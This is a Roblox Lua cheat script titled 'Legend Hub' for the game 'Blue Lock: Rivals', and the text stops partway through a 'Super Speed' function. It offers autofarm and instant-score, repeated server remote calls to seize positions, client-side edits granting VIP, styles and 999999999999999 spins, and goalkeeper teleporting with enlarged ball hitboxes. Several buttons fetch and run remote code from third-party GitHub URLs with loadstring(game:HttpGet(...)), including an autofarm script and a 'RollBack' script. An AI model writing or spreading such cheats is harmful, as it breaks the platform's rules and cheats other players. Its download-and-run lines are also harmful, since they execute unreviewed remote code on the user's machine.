local replicated_storage = game:GetService("ReplicatedStorage")
local players = game:GetService("Players")
local teams = game:GetService("Teams")
local user_input_service = game:GetService("UserInputService")
local run_service = game:GetService("RunService")
local player = players.LocalPlayer
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/IAmJamal10/Library/refs/heads/main/New"))()

local Window = Library.CreateLib("Blue Lock: Rivals | Legend Hub", "Midnight")

local Tab43 = Window:NewTab("Instant-Win")


local Tab11 = Window:NewTab("(Have Reo) Inf-Styles")

local Tab87 = Window:NewTab("Free-Emotes (UPD)")

local Tab = Window:NewTab("Main-Features")



local Tab3 = Window:NewTab("Instant-Position")


local Tab22 = Window:NewTab("Misc-Features")

local Tab1 = Window:NewTab("Settings")

local Section76 = Tab87:NewSection("Free-Emotes")
local Section = Tab:NewSection("Main-Features")
local Section99 = Tab43:NewSection("Instant-Score")

local Section65 = Tab3:NewSection("Auto-Position")

local Section00 = Tab11:NewSection("Inf-Styles (Must Have Reo Equipped)")

local Section22 = Tab22:NewSection("Misc-Features")

local CredSection = Tab1:NewSection("Settings")


Section99:NewToggle("AutoFarm", "AutoFarm Ball And Score", function(state)
if state then

_G.START = true -- true = on, false = off

loadstring(game:HttpGet("https://raw.githubusercontent.com/lnwskibidi/Roblox/main/BlueLockRivals.lua"))()
else
_G.START = false -- true = on, false = off

loadstring(game:HttpGet("https://raw.githubusercontent.com/lnwskibidi/Roblox/main/BlueLockRivals.lua"))()
end
end)
Section99:NewLabel("1. Turn on AutoFarm so it picks up the ball or get ball")
Section99:NewLabel("2. Disable AutoFarm once you have the ball")
Section99:NewLabel("3. Reset with the ball")
Section99:NewLabel("4. Pick up a position")
Section99:NewLabel("5. Turn on AutoFarm")
Section99:NewLabel("6. EZ")



Section76:NewToggle("Free Charles Blitz Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "76475889563016" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)



Section76:NewToggle("Free Waterbending Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "118458875512995" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)
Section76:NewToggle("Free Panther Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "137927079139126" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)

Section76:NewToggle("Free Nirvana Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "119396096500127" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)


Section76:NewToggle("Free Juggle Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "126910648476171" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)
Section76:NewToggle("Free Helicopter Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "132385577497589" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)


Section76:NewToggle("Free Knees Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "88982797209625" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)


Section76:NewToggle("Free King Team PosePlr1 Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "89026045613970" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)




Section76:NewToggle("Free Yum Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "113571086831013" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)





Section76:NewToggle("Free Zombie Walk Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "85217612132841" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)




Section76:NewToggle("Free Size Eyes Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "125865269944406" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)


Section76:NewToggle("Free Ultra Instinct Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "80405783743287" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)


Section76:NewToggle("Free Bee Flight Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "81851805986140" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)


Section76:NewToggle("Free Isagi's Slide Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "99359140003696" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)

Section76:NewToggle("Free Unlimited Strength Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "94623604238380" --- add ID's farom the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)
Section76:NewToggle("Free Bunny Hop Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "113599340078768" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)


Section76:NewToggle("Free Ninja Run Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "72224249513625" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)
Section76:NewButton("Free Gamepass King's Roar Emote", "Free Emotes Everyone Can See", function()

  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "79284461623364 " --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed() 

end)


Section76:NewToggle("Free Gamepass L Dance Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "105830694875557" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)


Section76:NewToggle("Whip Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "94649499784710" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)
Section76:NewToggle("Crying Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "97771700408539" --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(2) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)

Section76:NewToggle("Dance Step Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "89470737691761 " --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(2) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)


Section76:NewToggle("Headless Emote", "Free Emotes Everyone Can See", function(state)
if state then
  Player = "LocalPlayer" --- you can still put any player name here


AnimationId = "115140507669868 " --- add ID's from the bottom[/size]
local Anim = Instance.new("Animation") --- Creates animation[/size]
Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
k:Play() --Play the animation ----- Runs the animation.[/size]
k:AdjustSpeed(1.5) 


else

h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end
end)
Section65:NewToggle("Instant Be CF (Home)", "Flow", function(Value)
 a = Value
        while a do task.wait(1)
        pcall(function()
local args = {
    [1] = "Home",
    [2] = "CF"
}

game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild("Select"):FireServer(unpack(args))

end)
end
end)

Section65:NewToggle("Instant Be CM (Home)", "Flow", function(Value)
 a = Value
        while a do task.wait(1)
        pcall(function()
local args = {
    [1] = "Home",
    [2] = "CM"
}

game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild("Select"):FireServer(unpack(args))

end)
end
end)

Section65:NewToggle("Instant Be GK (Home)", "Flow", function(Value)
 a = Value
        while a do task.wait(1)
        pcall(function()
local args = {
    [1] = "Home",
    [2] = "GK"
}

game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild("Select"):FireServer(unpack(args))

end)
end
end)

Section65:NewToggle("Instant Be LW (Home)", "Flow", function(Value)
 a = Value
        while a do task.wait(1)
        pcall(function()
local args = {
    [1] = "Home",
    [2] = "LW"
}

game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild("Select"):FireServer(unpack(args))

end)
end
end)

Section65:NewToggle("Instant Be RW (Home)", "Flow", function(Value)
 a = Value
        while a do task.wait(1)
        pcall(function()
local args = {
    [1] = "Home",
    [2] = "RW"
}

game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild("Select"):FireServer(unpack(args))

end)
end
end)

Section65:NewToggle("Instant Be CF (Away)", "Flow", function(Value)
 a = Value
        while a do task.wait(1)
        pcall(function()
local args = {
    [1] = "Away",
    [2] = "CF"
}

game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild("Select"):FireServer(unpack(args))

end)
end
end)

Section65:NewToggle("Instant Be CM (Away)", "Flow", function(Value)
 a = Value
        while a do task.wait(1)
        pcall(function()
local args = {
    [1] = "Away",
    [2] = "CM"
}

game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild("Select"):FireServer(unpack(args))

end)
end
end)

Section65:NewToggle("Instant Be GK (Away)", "Flow", function(Value)
 a = Value
        while a do task.wait(1)
        pcall(function()
local args = {
    [1] = "Away",
    [2] = "GK"
}

game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild("Select"):FireServer(unpack(args))

end)
end
end)

Section65:NewToggle("Instant Be LW (Away)", "Flow", function(Value)
 a = Value
        while a do task.wait(1)
        pcall(function()
local args = {
    [1] = "Away",
    [2] = "LW"
}

game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild("Select"):FireServer(unpack(args))

end)
end
end)

Section65:NewToggle("Instant Be RW (Away)", "Flow", function(Value)
 a = Value
        while a do task.wait(1)
        pcall(function()
local args = {
    [1] = "Away",
    [2] = "RW"
}

game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("TeamService"):WaitForChild("RE"):WaitForChild("Select"):FireServer(unpack(args))

end)
end
end)

local function set_style(desired_style)
    if player:FindFirstChild("PlayerStats") then
        local playerStats = player.PlayerStats
        if playerStats:FindFirstChild("Style") then
            playerStats.Style.Value = desired_style
        end
    end
end

Section00:NewTextBox("Custom Style", "Type Your Own Style", function(custom_style)
	   if custom_style ~= "" then
            set_style(custom_style)
        end
end)

Section00:NewLabel("Pre-Made Ones ↓")



Section00:NewButton("Unlock Charles Style", "Style", function()
  set_style("Charles")
end)


Section00:NewButton("Unlock Kunigami Style", "Style", function()
  set_style("Kunigami")
end)
Section00:NewButton("Unlock Loki Style", "Style", function()
  set_style("Loki")
end)


Section00:NewButton("Unlock NEL Rin Style", "Style", function()
  set_style("Nel Rin")
end)

Section00:NewButton("Unlock Bachira Style", "Bachira Style", function()
  set_style("Bachira")
end)
Section00:NewButton("Unlock NEL Bachira Style", "NEL Bachira Style", function()
  set_style("NEL Bachira")
end)

Section00:NewButton("Unlock Igaguri Style", "Igaguri Style", function()
   set_style("Igaguri")
end)
Section00:NewButton("Unlock Kaiser Style", "Kaiser Style", function()
   set_style("Kaiser")
end)

Section00:NewButton("Unlock Yukimiya Style", "Yukimiya Style", function()
   set_style("Yukimiya")
end)
Section00:NewButton("Unlock NEL Isagi Style", "Isagi Style", function()
   set_style("NEL Isagi")
end)

Section00:NewButton("Unlock Don Lorenzo Style", "Don Style", function()
   set_style("Don Lorenzo")
end)
Section00:NewButton("Unlock Aiku Style", "Aiku Style", function()
   set_style("Aiku")
end)

Section00:NewButton("Unlock Sae Style", "Sae Style", function()
   set_style("Sae")
end)

Section00:NewButton("Unlock Rin Style", "Rin Style", function()
  set_style("Rin")
end)
Section00:NewButton("Unlock Shidou Style", "Shidou Style", function()
  set_style("Shidou")
end)

Section00:NewButton("Unlock Nagi Style", "Nagi Style", function()
   set_style("Nagi")
end)


Section:NewToggle("Infinite Spins", "Inf Spins", function(Value)
 a = Value
        while a do task.wait()
        pcall(function()

game:GetService("Players").LocalPlayer.ProfileStats.Spins.Value = 999999999999999

end)
end
end)

Section:NewButton("Auto GK v1 (Jump and get close to the ball)", " Jump and get close to the ball Auto GK", function()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")
local ball = game.Workspace:WaitForChild("Football")

-- GUI Setup
local gui = Instance.new("ScreenGui")
gui.Parent = player:WaitForChild("PlayerGui")

-- Ensure GUI is visible
gui.ResetOnSpawn = false

-- Create "Lock to Ball (GK)" Button
local lockToBallButton = Instance.new("TextButton")
lockToBallButton.Size = UDim2.new(0, 150, 0, 50)
lockToBallButton.Position = UDim2.new(0, 10, 0, 10)
lockToBallButton.Text = "Lock to Ball (GK): OFF"
lockToBallButton.Parent = gui
lockToBallButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
lockToBallButton.TextColor3 = Color3.fromRGB(255, 255, 255)
lockToBallButton.BorderSizePixel = 2

-- States
local lockToBall = false
local originalBallSize = ball.Size
local hitboxMultiplier = 3

-- Your Goal Position
local myGoal = game.Workspace.AI.Home.DiveBox.Position

-- Stop Ball Function
local function stopBallCompletely()
    if ball then
        ball.AssemblyLinearVelocity = Vector3.zero
        ball.AssemblyAngularVelocity = Vector3.zero
        ball.Velocity = Vector3.zero
        ball.RotVelocity = Vector3.zero
        ball.Anchored = true
        task.wait(0.1)
        ball.Anchored = false
    end
end

-- Modify Ball Hitbox
local function modifyBallSize(enable)
    if enable then
        ball.Size = originalBallSize * hitboxMultiplier
    else
        ball.Size = originalBallSize
    end
end

-- Lock to Ball (GK) + Improved Diving System
local function lockToBallFunction()
    local animController = game:GetService("ReplicatedStorage").Controllers.AnimatonController
    while lockToBall do
        if ball then
            rootPart.CFrame = CFrame.lookAt(rootPart.Position, ball.Position)

            -- If the ball is near **your** goal, teleport & dive
            if (ball.Position - myGoal).Magnitude < 40 then
                rootPart.CFrame = CFrame.new(ball.Position + Vector3.new(0, 3, 0))
                
                -- **Prevent Unwanted Jumping**
                humanoid.JumpPower = 0
                humanoid:Move(Vector3.new(0, -10, 0)) -- Forces the player downward to stop extra jump

                stopBallCompletely()

                -- Detect where the ball is going
                local ballVelocity = ball.AssemblyLinearVelocity
                local ballSpeed = ballVelocity.Magnitude
                local ballDirection = ballVelocity.Unit

                -- **Instant Reaction Diving**
                if ballSpeed > 0 then
                    if ballDirection.X > 0.5 then
                        animController.DiveR:Play() -- Dive Right
                    elseif ballDirection.X < -0.5 then
                        animController.DiveL:Play() -- Dive Left
                    elseif ballDirection.Y > 0.5 then
                        animController.DiveF:Play() -- Dive Forward
                    else
                        animController.DiveF:Play() -- Default to Forward
                    end
                end

                -- **Re-enable Jump after Catching**
                task.wait(0.5)
                humanoid.JumpPower = 50 -- Reset to normal jump power
            end
        end
        task.wait(0.01) -- **Super Fast Reaction Time**
    end
end

-- "Lock to Ball (GK)" Button Toggle
lockToBallButton.MouseButton1Click:Connect(function()
    lockToBall = not lockToBall
    lockToBallButton.Text = lockToBall and "Lock to Ball (GK): ON" or "Lock to Ball (GK): OFF"
    
    -- **Modify Hitbox Properly**
    modifyBallSize(lockToBall)

    -- **Start/Stop the Lock-to-Ball Function**
    if lockToBall then 
        task.spawn(lockToBallFunction) 
    end
end)
end)

Section:NewButton("Auto GK v2", " Jump and get close to the ball Auto GK", function()
-- Local references to player and character
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")
local ball = game.Workspace:WaitForChild("Football")

-- Define goal boxes
local homeBox = game.Workspace.AI.Home.DiveBox
local awayBox = game.Workspace.AI.Away.DiveBox
local originalBallSize = ball.Size

-- Create GUI
local gui = Instance.new("ScreenGui")
gui.Parent = player:WaitForChild("PlayerGui")

-- Toggle button
local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 150, 0, 50)
button.Position = UDim2.new(0, 10, 0.5, -25)
button.Text = "GK Mode: OFF"
button.Parent = gui

-- Highlight for the ball's hitbox
local ballHighlight = Instance.new("Part")
ballHighlight.Size = Vector3.new(originalBallSize.X * 4, originalBallSize.Y * 4, originalBallSize.Z * 4)
ballHighlight.Anchored = true
ballHighlight.CanCollide = false
ballHighlight.BrickColor = BrickColor.new("Bright yellow")
ballHighlight.Material = Enum.Material.Neon
ballHighlight.Transparency = 0.5
ballHighlight.Parent = game.Workspace

-- Highlight for the player's enlarged hitbox
local playerHighlight = Instance.new("Part")
playerHighlight.Size = Vector3.new(4, 7, 4) -- Enlarged hitbox for the player
playerHighlight.Anchored = false
playerHighlight.CanCollide = false
playerHighlight.BrickColor = BrickColor.new("Bright blue")
playerHighlight.Material = Enum.Material.Neon
playerHighlight.Transparency = 0.5
playerHighlight.Parent = game.Workspace
playerHighlight.CFrame = rootPart.CFrame -- Sync with the player's position

-- Weld the player's hitbox to the root part
local weld = Instance.new("WeldConstraint")
weld.Part0 = rootPart
weld.Part1 = playerHighlight
weld.Parent = rootPart

-- GK mode variables
local gkMode = false
local gkLoop = nil

-- Function to get player's team
local function getTeam()
    if player.Team and player.Team.Name == "Home" then
        return "Home", homeBox
    elseif player.Team and player.Team.Name == "Away" then
        return "Away", awayBox
    else
        return nil, nil
    end
end

-- Function to update ball hitbox highlight
local function updateBallHighlight()
    ballHighlight.CFrame = ball.CFrame
end

-- Function to show direction arrows
local function showArrow(direction)
    -- Placeholder function for any future direction indicators
end

-- Main GK function
local function autoGK()
    while gkMode do
        -- Ensure character and ball references are valid
        character = player.Character or player.CharacterAdded:Wait()
        humanoid = character:WaitForChild("Humanoid")
        rootPart = character:WaitForChild("HumanoidRootPart")
        ball = game.Workspace:WaitForChild("Football")

        local team, diveBox = getTeam()
        if team and diveBox and ball then
            local ballPos = ball.Position
            local boxPos = diveBox.Position
            local distance = (ballPos - boxPos).Magnitude

            -- Update ball highlight position
            updateBallHighlight()

            -- Move left or right when ball is close to the goal
            if distance < 25 then
                local moveDirection = (ballPos - rootPart.Position).Unit

                -- Only move left or right
                if math.abs(moveDirection.X) > math.abs(moveDirection.Z) then
                    if moveDirection.X > 0 then
                        humanoid:Move(Vector3.new(1, 0, 0), true)
                    else
                        humanoid:Move(Vector3.new(-1, 0, 0), true)
                    end
                end
            else
                humanoid:Move(Vector3.zero, true) -- Stop movement if ball is not close
            end
        end
        task.wait(0.01) -- Ultra-fast reaction time
    end
end

-- Button click event to toggle GK mode
button.MouseButton1Click:Connect(function()
    gkMode = not gkMode
    button.Text = gkMode and "GK Mode: ON" or "GK Mode: OFF"

    if gkMode then
        gkLoop = task.spawn(autoGK)
        ballHighlight.Transparency = 0.5 -- Show ball highlight
        playerHighlight.Transparency = 0.5 -- Show player highlight
    else
        if gkLoop then
            task.cancel(gkLoop)
        end
        ballHighlight.Transparency = 1 -- Hide ball highlight
        playerHighlight.Transparency = 1 -- Hide player highlight
    end
end)
end)
Section:NewButton("Unlock Free VIP (FIXED)", "Get VIP", function()
game:GetService("Players").LocalPlayer.HasVIP.Value = true
end)

Section:NewButton("RollBack", "RollBack", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Youifpg/Blr-inf/refs/heads/main/Rollback.lua"))()
end)
Section:NewButton("Super Speed", "Super Speed", function()
function isNumber(str)
  if tonumber(str) ~= nil or str == 'inf' then
    return true
  end
end
local tspeed = 0.8
